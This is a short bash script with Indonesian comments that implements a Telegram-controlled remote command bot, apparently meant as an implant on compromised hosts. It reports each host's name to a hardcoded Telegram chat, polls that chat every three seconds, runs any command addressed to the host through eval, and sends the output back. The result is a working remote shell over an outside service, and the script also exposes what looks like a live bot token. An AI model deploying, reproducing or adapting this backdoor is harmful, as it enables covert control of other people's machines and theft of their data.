#!/bin/bash

# Konfigurasi
BOT_TOKEN="7987285255:AAEP_NXmRlE-Zoipo0V7PQ4gOWfj-6eFzuY"
CHAT_ID="-4619234228"
HOSTNAME=$(hostname)
PID_FILE="/tmp/bot_cmd.pid"

# Fungsi untuk mengirim pesan ke Telegram
send_message() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=$message" \
        -d "parse_mode=HTML" > /dev/null
}

# Notifikasi saat bot pertama kali berjalan
send_message "[$HOSTNAME] bot berhasil masuk kandang"

# Simpan PID untuk pemantauan
echo $$ > "$PID_FILE"

# Loop utama untuk menerima perintah dari Telegram
while true; do
    # Ambil update terakhir dari bot
    UPDATE_URL="https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=-1"
    RESPONSE=$(curl -s "$UPDATE_URL")

    # Ekstrak pesan terbaru
    MESSAGE=$(echo "$RESPONSE" | grep -oP '(?<="text":")[^"]*')

    # Cek apakah pesan diawali dengan hostname kita
    if [[ "$MESSAGE" == "$HOSTNAME "* ]]; then
        CMD="${MESSAGE#"$HOSTNAME "}"  # Hapus hostname dari perintah

        # Jalankan perintah & ambil output
        OUTPUT=$(eval "$CMD" 2>&1)

        # Kirim hasil eksekusi ke Telegram
        send_message "[$HOSTNAME] Command: <code>$CMD</code>\n\n<pre>$OUTPUT</pre>"
    fi

    # Tunggu 3 detik sebelum loop berikutnya
    sleep 3
done

# Notifikasi jika bot mati
send_message "[$HOSTNAME] bot keluar kandang / lepas"
